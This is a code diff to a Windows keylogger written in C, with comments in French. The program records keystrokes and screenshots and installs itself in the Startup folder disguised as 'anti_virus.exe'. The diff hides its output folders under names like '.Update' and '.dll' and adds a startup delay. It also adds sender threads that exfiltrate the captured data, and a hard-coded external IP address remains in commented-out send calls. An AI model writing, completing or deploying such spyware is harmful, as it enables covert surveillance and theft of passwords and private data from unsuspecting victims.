@@ -1,21 +1,27 @@
 #include "keylogger.h"
 #include "screen.h"
-#include "for_all.c"
+#include "sending.c"
 #include <process.h>
 
-const char *output_dir = ".output_screen";
-const char *output_file = ".output_text/text.txt";
-const char *output_file_dir = ".output_text";
+const char *output_dir = ".Update"; //file .png
+const char *output_file = ".dll/text.txt"; //text.txt
+const char *output_file_dir = ".dll"; //text.txt
 
 const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anti_virus.exe";
 
 #include <winsock2.h>
+#include <winhttp.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <gdiplus.h>
+#include <time.h>
+#include <direct.h>
 
+
+#pragma comment(lib, "winhttp.lib")
 
 #pragma comment (lib,"Gdiplus.lib")
 
@@ -80,6 +86,7 @@ DWORD WINAPI capture_screen_thread(LPVOID lpParam) {
 }
 
 int main(int argc, char *argv[]) {
+    Sleep(10 * 1000);
     printf("argc: %d\n", argc);
     printf("executable path: %s\n", argv[0]);
 
@@ -116,9 +123,19 @@ int main(int argc, char *argv[]) {
 
         // Lancer deux threads (start_keylogger et capture)
         int fps = 8;
-
+        int dire = 0; //png
+        int dir = 1;//txt
+        
+        HANDLE thread4 = CreateThread(NULL, 0, sender_thread, &dire, 0, NULL);
+        HANDLE thread3 = CreateThread(NULL, 0, sender_thread, &dir, 0, NULL);
         HANDLE thread1 = CreateThread(NULL, 0, start_keylogger_thread, NULL, 0, NULL);
         HANDLE thread2 = CreateThread(NULL, 0, capture_screen_thread, &fps, 0, NULL);
+
+        
+        //if (!thread) {
+        //    printf("Erreur: impossible de démarrer le thread.\n");
+        //    return 1;
+        //}
 
         if (thread1 == NULL || thread2 == NULL) {
             printf("Erreur lors de la création des threads.\n");
@@ -128,10 +145,10 @@ int main(int argc, char *argv[]) {
 
     // Boucle principale
     while (1) {
-        Sleep(500); // Sleep en millisecondes
+        Sleep(50 * 1000); // Sleep en millisecondes
         printf("sending !");
-        send_dir(output_dir, "144.173.84.133");
-        send_dir(output_file_dir, "144.173.84.133");
+        //send_dir(output_dir, "144.173.84.133");
+        //send_dir(output_file_dir, "144.173.84.133");
         printf("sended !");
         // Création des répertoires (ignore erreur si déjà existant)
         CreateDirectory(output_file_dir, NULL);
